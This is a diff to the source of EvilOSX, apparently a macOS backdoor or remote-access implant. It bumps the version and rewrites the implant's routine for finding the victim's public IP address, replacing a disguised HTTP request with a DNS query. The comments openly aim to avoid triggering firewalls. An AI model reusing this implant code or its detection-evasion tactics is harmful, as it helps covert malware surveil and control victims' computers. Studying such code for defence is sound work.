@@ -4,7 +4,7 @@
 # Random Hash: This text will be replaced when building EvilOSX.
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "2.1.1"
+__version__ = "2.1.2"
 
 import time
 import urllib2
@@ -128,15 +128,8 @@ def get_uid():
 def get_remote_ip():
     """:return The client's remote IP address."""
     try:
-        # Using curl triggers firewalls, hopefully this doesn't?
-        # It's always safer to just disable fetching remote IPs.
-        request_path = "https://icanhazip.com/"
-        headers = {"User-Agent": _get_random_user_agent()}
-
-        request = urllib2.Request(url=request_path, headers=headers)
-        response = urllib2.urlopen(request, timeout=3)
-
-        return response.read().replace("\n", "")
+        # Using https://icanhazip.com may trigger firewalls, hopefully this doesn't?
+        return run_command("dig +short myip.opendns.com @resolver1.opendns.com")
     except Exception:
         return "Unknown"
 
